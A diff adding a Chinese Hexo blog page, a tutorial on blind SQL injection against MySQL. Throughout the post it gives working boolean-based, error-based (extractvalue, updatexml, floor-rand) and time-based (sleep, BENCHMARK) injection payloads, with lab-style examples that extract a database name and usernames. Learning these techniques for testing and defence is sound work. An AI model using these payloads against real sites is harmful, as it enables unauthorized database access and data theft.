@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/favicon.ico >
+    <title>
+        Hexo
+    </title>
+    <meta name="description" content= 嘿，我是刘训灼～这是我的子站，用于展示写的Hexo主题：Coder。欢迎访问！ >
+    <meta name="keywords" content= Blog,Hexo,Theme,刘训灼,LiuXunzhuo >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            SQL注入基础（2）
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <h1 id="SQL注入基础（2）盲注"><a href="#SQL注入基础（2）盲注" class="headerlink" title="SQL注入基础（2）盲注"></a>SQL注入基础（2）盲注</h1><h2 id="何为盲注？"><a href="#何为盲注？" class="headerlink" title="何为盲注？"></a>何为盲注？</h2><p>盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面。需要利用一些方法进行判断或者尝试，这个过程称之为盲注</p>
+<p>​    •基于布尔 SQL 盲注<br>​    •基于时间的 SQL 盲注<br>​    •基于报错的 SQL 盲注</p>
+<h2 id="1-：基于布尔-L-SQL-盲注-———"><a href="#1-：基于布尔-L-SQL-盲注-———" class="headerlink" title="1 ：基于布尔 L SQL 盲注 ———-"></a>1 ：基于布尔 L SQL 盲注 ———-</h2><h3 id="▲left-database-1-gt-’s’-left-函数"><a href="#▲left-database-1-gt-’s’-left-函数" class="headerlink" title="▲left(database(),1)&gt;’s’         //left()函数"></a>▲left(database(),1)&gt;’s’         //left()函数</h3><p>Explain:database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</p>
+<h3 id="▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema"><a href="#▲ascii-substr-select-table-name-information-schema-tables-where-tables-schema" class="headerlink" title="▲ascii(substr((select table_name information_schema.tables where tables_schema"></a>▲ascii(substr((select table_name information_schema.tables where tables_schema</h3><p>=database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数<br>Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换<br>为 ascii 值</p>
+<h3 id="▲ascii-substr-select-database-1-1-98"><a href="#▲ascii-substr-select-database-1-1-98" class="headerlink" title="▲ascii(substr((select database()),1,1))=98"></a>▲ascii(substr((select database()),1,1))=98</h3><h3 id="▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDER"><a href="#▲ORD-MID-SELECT-IFNULL-CAST-username-AS-CHAR-0x20-FROM-security-users-ORDER" class="headerlink" title="▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER"></a>▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER</h3><h3 id="BY-id-LIMIT-0-1-1-1-gt-98-23-ORD-函数，MID-函数"><a href="#BY-id-LIMIT-0-1-1-1-gt-98-23-ORD-函数，MID-函数" class="headerlink" title="BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数"></a>BY id LIMIT 0,1),1,1))&gt;98%23 //ORD()函数，MID()函数</h3><p>Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位<br>Ord()函数同 ascii()，将字符转为 ascii 值</p>
+<h3 id="▲regexp-正则注入"><a href="#▲regexp-正则注入" class="headerlink" title="▲regexp 正则注入"></a>▲regexp 正则注入</h3><p>用法介绍：select user() regexp ‘^[a-z]’;<br>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。</p>
+<p>第二位可以用 select user() regexp ‘^ro’来进行。</p>
+<p>当正确的时候显示结果为 1，不正确的时候显示结果为 0.<br>示例介绍：<br>I select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0));<br>II select * from users where id=1 and 1=(user() regexp’^ri’);<br>通过 if 语句的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等<br>于 0 或者 1 进行判断。<br>III select * from users where id=1 and 1=(select 1 from information_schema.tables<br>where table_schema=’security’ and table_name regexp ‘^us[a-z]’ limit 0,1);<br>这里利用 select 构造了一个判断语句。我们只需要更换 regexp 表达式即可<br>‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE<br>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在<br>无法判断的情况下，可以用 table_name regexp ‘^username$’来进行判断。^是从开头进行<br>匹配，$是从结尾开始判断。更多的语法可以参考 mysql 使用手册进行了解。<br>好，这里思考一个问题？ table_name 有好几个，我们只得到了一个 user，如何知道其<br>他的？<br>这里可能会有人认为使用 limit 0，1 改为 limit 1,1。<br>但是这种做法是错误的，limit 作用在前面的 select 语句中，而不是 regexp。那我们该如<br>何选择。其实在 regexp 中我们是取匹配 table_name 中的内容，只要 table_name 中有的内<br>容，我们用 regexp 都能够匹配到。因此上述语句不仅仅可以选择 user，还可以匹配其他项。</p>
+<h3 id="▲like-匹配注入"><a href="#▲like-匹配注入" class="headerlink" title="▲like 匹配注入"></a>▲like 匹配注入</h3><p>和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配</p>
+<p>用法：select user() like ‘ro%’</p>
+<h2 id="2-2-：基于报错的-SQL-盲注-——-构造-payload-让信息通过错误提示回显出来"><a href="#2-2-：基于报错的-SQL-盲注-——-构造-payload-让信息通过错误提示回显出来" class="headerlink" title="2 2 ：基于报错的  SQL 盲注 —— 构造  payload 让信息通过错误提示回显出来"></a>2 2 ：基于报错的  SQL 盲注 —— 构造  payload 让信息通过错误提示回显出来</h2><h3 id="▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a"><a href="#▲Select-1-count-concat-0x3a-0x3a-select-user-0x3a-0x3a-floor-rand-0-2-a-from-information-schema-columns-group-by-a" class="headerlink" title="▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;"></a>▲Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;</h3><p>//explain:此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的<br>重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时<br>重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需<br>要多试几次才行。<br>以上语句可以简化成如下的形式。<br>select count(*) from information_schema.tables group by concat(version(),<br>floor(rand(0)<em>2))<br>如果关键的表被禁用了，可以使用这种形式<br>select count(</em>) from (select 1 union select null union<br>select !1) group by concat(version(),floor(rand(0)*2))<br>如果 rand 被禁用了可以使用用户变量来报错<br>select min(@a:=1) from information_schema.tables group by concat(passwo<br>rd,@a:=(@a+1)%2)</p>
+<h3 id="▲select-exp-select-FROM-SELECT-USER-a-double-数值类型超出范围"><a href="#▲select-exp-select-FROM-SELECT-USER-a-double-数值类型超出范围" class="headerlink" title="▲select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围"></a>▲select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围</h3><p>//Exp()为以 e 为底的对数函数<br>可以参考 exp 报错文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
+<h3 id="▲select-select-from-select-user-x-（ps-这是减号）-0"><a href="#▲select-select-from-select-user-x-（ps-这是减号）-0" class="headerlink" title="▲select !(select * from (select user())x) -（ps:这是减号） ~0"></a>▲select !(select * from (select user())x) -（ps:这是减号） ~0</h3><p>//bigint 超出范围；~0 是对 0 逐位取反<br>可以参考文章 bigint 溢出文章 <a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
+<h3 id="▲extractvalue-1-concat-0x7e-select-version-0x7e-se-mysql-对-xml-数据进行查询和修改的-xpath-函数，xpath-语法错误"><a href="#▲extractvalue-1-concat-0x7e-select-version-0x7e-se-mysql-对-xml-数据进行查询和修改的-xpath-函数，xpath-语法错误" class="headerlink" title="▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误"></a>▲extractvalue(1,concat(0x7e,(select @@version),0x7e)) se//mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误</h3><h3 id="▲updatexml-1-concat-0x7e-select-version-0x7e-1-mysql对xml数据进行"><a href="#▲updatexml-1-concat-0x7e-select-version-0x7e-1-mysql对xml数据进行" class="headerlink" title="▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql对xml数据进行"></a>▲updatexml(1,concat(0x7e,(select @@version),0x7e),1) //mysql对xml数据进行</h3><p>查询和修改的 xpath 函数，xpath 语法错误</p>
+<h3 id="▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x"><a href="#▲select-from-select-NAME-CONST-version-1-NAME-CONST-version-1-x" class="headerlink" title="▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;"></a>▲select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</h3><p>​    //mysql 重复特性，此处重复了 version，所以报错。</p>
+<h2 id="3-基于时间的-SQL-盲注-———-延时注入"><a href="#3-基于时间的-SQL-盲注-———-延时注入" class="headerlink" title="3: 基于时间的  SQL 盲注 ———- 延时注入"></a>3: 基于时间的  SQL 盲注 ———- 延时注入</h2><h3 id="▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-if-判断语句，条件为假，执行sleep"><a href="#▲If-ascii-substr-database-1-1-gt-115-0-sleep-5-23-if-判断语句，条件为假，执行sleep" class="headerlink" title="▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 ///if 判断语句，条件为假，执行sleep"></a>▲If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 ///if 判断语句，条件为假，执行sleep</h3><p>​    Ps： 遇到以下这种利用 sleep()延时注入语句<br>select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8,9,.’));<br>该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可<br>取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</p>
+<h3 id="▲UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘MSG’-’by-5-seconds’-null-FROM-select-database-as-current-as-tb1"><a href="#▲UNION-SELECT-IF-SUBSTRING-current-1-1-CHAR-119-BENCHMARK-5000000-ENCODE-‘MSG’-’by-5-seconds’-null-FROM-select-database-as-current-as-tb1" class="headerlink" title="▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;"></a>▲UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</h3><p>​    //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达<br>式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执<br>行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()</p>
+<h2 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h2><pre><code>    left(version(),1)=5--+</code></pre>
+<p>查看一下 version()，数据库的版本号为 5.6.17，这里的语句的意思是看版本号的第一位是不是5</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">length(database())&#x3D;8--+</span><br></pre></td></tr></table></figure>
+
+
+<p>长度为 8 时，返回正确结果，说明长度为 8.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;&#39;a&#39;--+</span><br></pre></td></tr></table></figure>
+
+<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当<br>我们不知情的情况下，可以用二分法来提高注入的效率</p>
+<p>前两位是否大于 sa</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),2)&gt;&#39;sa&#39;--+</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+        <hr class="fhr">
+        <div id="vcomments"></div>
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>版权所有 © 2020 | 作者: ASSIN | 主题 By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">本站浏览总访问量: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">本站访问人数: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="NOsswOncKgc8HOxqo9oxIWlX-gzGzoHsz">
+<input type="hidden" id="valine_appKey" value="z1FihjWEbS8uIfUQdmCtK7zz">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
